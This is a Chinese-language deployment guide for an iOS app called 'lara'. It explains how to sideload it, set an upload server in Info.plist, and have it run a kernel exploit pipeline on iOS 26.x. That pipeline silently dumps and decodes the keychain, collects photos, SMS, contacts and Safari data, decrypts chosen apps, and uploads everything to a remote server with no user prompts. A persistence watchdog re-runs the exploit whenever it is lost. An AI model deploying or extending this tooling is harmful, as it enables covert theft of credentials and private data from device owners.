# lara 部署文档 — iOS 26.1 ~ 26.6（自动提取/钥匙串解码上传/砸壳/不重启）

## 一、版本支持状态

| iOS 版本 | 安装 | 功能运行（提取/钥匙串/砸壳） |
|---|---|---|
| 26.0.x 及以下 | ✅ | ✅ **完全可用**（DarkSword 可利用） |
| **26.1 / 26.2 / 26.2.1** | ✅ | ⏳ 等待内核 exploit（候选：CVE-2026-20698 等，PoC 已就绪） |
| **26.3 / 26.3.1** | ✅ | ⏳ 同上（20698 可用） |
| **26.4 / 26.4.1 / 26.4.2** | ✅ | ⏳ 等待（20698 已修，候选：43654/28972 等） |
| **26.5 / 26.5.1 / 26.5.2** | ✅ | ⏳ 等待（26.6 组漏洞） |
| **26.6** | ✅ | ⏳ 等待（26.6 xnu 源码未公开） |

> 代码层已全部就绪：**只要对应版本的内核提权可用，功能立即端到端工作，无需改代码**。
> exploit 一旦跑通，原语会自动恢复（不重启），流水线自动完成全部动作。

## 二、安装

1. macOS + Xcode 16 打开 `lara.xcodeproj`（工程用文件夹同步，新模块自动进构建）。
2. 在 `Info.plist` 加入配置（见下），或运行时写入 UserDefaults。
3. 构建 IPA：`./scripts/build_ipa.sh`（或 Xcode Archive）。
4. 侧载：AltStore / Sideloadly / TrollStore 均可（需有效签名）。
5. 首启设置：在设置里开启 `lara.forceOffsets`（研究覆盖，26.1+ 必需，
   否则 app 会提示不支持并退出）。也可以在 `isunsupported.swift` 里把
   26.x 判定移除后重新打包。

## 三、服务器配置（Info.plist）

```xml
<key>lara.upload.serverURL</key>
<string>https://你的服务器/upload</string>
<key>lara.upload.apiToken</key>
<string>你的令牌</string>
<key>lara.upload.deviceID</key>
<string>设备唯一标识</string>

<!-- 自动提取的文件/目录路径列表（zip 打包后上传 /files） -->
<key>lara.auto.extractPaths</key>
<array>
  <string>/private/var/mobile/Media/DCIM</string>
  <string>/private/var/mobile/Library/SMS</string>
  <string>/private/var/mobile/Library/AddressBook</string>
  <string>/private/var/mobile/Library/Safari</string>
</array>

<!-- 自动砸壳的 app bundle ID 列表（解密后上传 /files） -->
<key>lara.auto.decryptBundleIDs</key>
<array>
  <string>com.example.targetapp</string>
</array>

<key>lara.auto.enabled</key><true/>
<key>lara.auto.alwaysUpload</key><true/>      <!-- 每次打开都重新提取上传 -->
<key>lara.auto.dedup</key><true/>             <!-- 内容哈希去重 -->
<key>lara.auto.includeRawDB</key><true/>      <!-- 附带 keychain-2.db base64 -->
```

## 四、自动流水线行为（用户无感）

打开 app → 内核原语就绪（exploit 或 launchd stash 恢复，**不重启则一直在**）→
VFS 就绪 → 自动执行：

```
① 提取钥匙串：dump /var/Keychains/keychain-2.db
② 解码：尝试全部密钥后端（内核 keybag 扫描 → securityd → AppleKeyStore MIG）
③ 上传：POST /upload/keychain（JSON：明文/密文条目 + 原始DB base64 + SHA256）
④ 文件提取：extractPaths 逐项 → zip → POST /upload/files
⑤ 砸壳：decryptBundleIDs 逐项 → 解密二进制 → POST /upload/files
```

- 无弹窗、无用户操作；失败自动退避重试；未上传 payload 持久化，下次打开续传
- 服务器端参考收件端：`research/upload_server.py`（`POST /upload/keychain`、
  `POST /upload/files`，Bearer 鉴权）

## 五、中途不重启

- `keepalive`：启动自动恢复 launchd 里的内核 R/W stash；5s 看门狗探活；
  原语丢失自动重跑 exploit
- **只要设备不重启**，内核原语持续存在，流水线随时可用
- 设备重启后需重新打开一次 app（自动重新 exploit）

## 六、文件清单

| 模块 | 作用 |
|---|---|
| `classes/autopipeline.swift` | 自动流水线（钥匙串+文件+砸壳+上传） |
| `classes/keychainmgr.swift` | 钥匙串提取+解码 |
| `classes/extractmgr.swift` | 全盘文件提取+zip 打包 |
| `classes/uploadmgr.swift` | HTTPS 上传（multipart/JSON，重试） |
| `classes/keepalive.swift` | 不重启常驻看门狗 |
| `classes/versiongate.swift` | 版本闸门研究覆盖+漏洞状态探测 |
| `kexploit/decrypt.m` | 砸壳（App Decrypt） |
| `research/poc_20698.c` | CVE-2026-20698 触发 PoC（真机验证用） |
